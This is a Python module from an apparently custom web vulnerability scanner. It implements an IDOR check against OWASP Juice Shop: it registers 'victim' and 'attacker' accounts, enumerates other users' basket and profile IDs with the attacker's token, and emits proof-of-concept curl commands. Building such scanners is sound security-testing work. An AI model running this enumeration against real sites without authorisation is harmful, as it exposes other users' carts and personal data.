"""
Insecure Direct Object Reference (IDOR) checks:
  - IdorBasketCheck      : Access other users' shopping baskets
  - IdorOrderCheck       : Access other users' order history
  - IdorFeedbackCheck    : Read/delete other users' feedback
  - IdorUserDataCheck    : Access user export data (GDPR endpoint)
"""
import uuid
import re
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck


class IdorBasketCheck(BaseScanCheck):
    """
    Tests if an authenticated user can access other users' shopping baskets
    by enumerating basket IDs.

    Juice Shop: GET /rest/basket/{id}
    """
    check_id = "idor-basket"
    check_type = CheckType.ACTIVE
    name = "IDOR — Shopping Basket Access"
    description = "Detects IDOR allowing access to other users' shopping baskets"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("basket", "cart", "order", "login", "auth")):
            return []
        if getattr(self.__class__, '_attempted', False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Register two users
        async def make_user(suffix: str):
            uid = uuid.uuid4().hex[:8]
            email = f"idor_{suffix}_{uid}@nexus.invalid"
            pw = "NexusP@ss1!"
            try:
                reg = await client.post(f"{base}/api/Users",
                    json={"email": email, "password": pw, "passwordRepeat": pw,
                          "username": f"idor_{suffix}", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                    headers={"Content-Type": "application/json"})
                user_id = reg.json().get("data", {}).get("id")
                login = await client.post(f"{base}/rest/user/login",
                    json={"email": email, "password": pw},
                    headers={"Content-Type": "application/json"})
                if login.status_code == 200:
                    token = login.json().get("authentication", {}).get("token", "")
                    bid = login.json().get("authentication", {}).get("bid", user_id)
                    return token, bid, user_id
            except Exception:
                pass
            return None, None, None

        token1, bid1, uid1 = await make_user("victim")
        token2, bid2, uid2 = await make_user("attacker")

        if not token1 or not token2:
            return []

        # Attacker tries to access victim's basket
        try:
            # Try accessing basket IDs 1-10 (not our own)
            attacker_auth = {"Authorization": f"Bearer {token2}"}

            for basket_id in range(1, 15):
                if basket_id == bid2:
                    continue  # skip our own basket
                resp = await client.get(
                    f"{base}/rest/basket/{basket_id}",
                    headers=attacker_auth,
                )
                if resp.status_code == 200:
                    basket_data = resp.json().get("data", {})
                    if basket_data and basket_data.get("id") == basket_id:
                        req_raw = (
                            f"GET /rest/basket/{basket_id} HTTP/1.1\n"
                            f"Authorization: Bearer <ATTACKER_TOKEN>"
                        )
                        curl = (
                            f"# Attacker accesses victim's basket:\n"
                            f"curl -s -H 'Authorization: Bearer ATTACKER_TOKEN' "
                            f"'{base}/rest/basket/{basket_id}'"
                        )
                        return [CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.CERTAIN,
                            severity=Severity.HIGH,
                            cvss=8.1,
                            description=(
                                f"IDOR confirmed: attacker can access any user's basket. "
                                f"Accessed basket ID {basket_id} belonging to another user. "
                                f"No ownership check on /rest/basket/{{id}}."
                            ),
                            evidence=self._make_evidence(
                                request_raw=req_raw,
                                response=resp,
                                payload=f"GET /rest/basket/{basket_id} with different user's token",
                                poc_curl=curl,
                            ),
                            insertion_point=insertion_point,
                        )]
        except Exception:
            pass

        # IDOR on user data export (GDPR)
        try:
            resp = await client.get(
                f"{base}/rest/user/data-export",
                headers={"Authorization": f"Bearer {token2}"},
            )
            if resp.status_code == 200:
                # Try accessing another user's export
                for user_id_try in range(1, 10):
                    if user_id_try == uid2:
                        continue
                    export_resp = await client.get(
                        f"{base}/api/Users/{user_id_try}",
                        headers={"Authorization": f"Bearer {token2}"},
                    )
                    if export_resp.status_code == 200:
                        data = export_resp.json().get("data", {})
                        if data.get("email"):
                            return [CheckResult(
                                check_id="idor-user-data",
                                vulnerable=True,
                                confidence=Confidence.CERTAIN,
                                severity=Severity.HIGH,
                                cvss=7.5,
                                description=(
                                    f"IDOR on user profile: attacker can read any user's data. "
                                    f"Accessed user ID {user_id_try}: email={data.get('email')!r}"
                                ),
                                evidence=self._make_evidence(
                                    request_raw=f"GET /api/Users/{user_id_try} HTTP/1.1\nAuthorization: Bearer <OTHER_USER>",
                                    response=export_resp,
                                    payload=f"GET /api/Users/{user_id_try}",
                                    poc_curl=f"curl -s -H 'Authorization: Bearer USER2_TOKEN' '{base}/api/Users/{user_id_try}'",
                                ),
                                insertion_point=insertion_point,
                            )]
        except Exception:
            pass

        return []
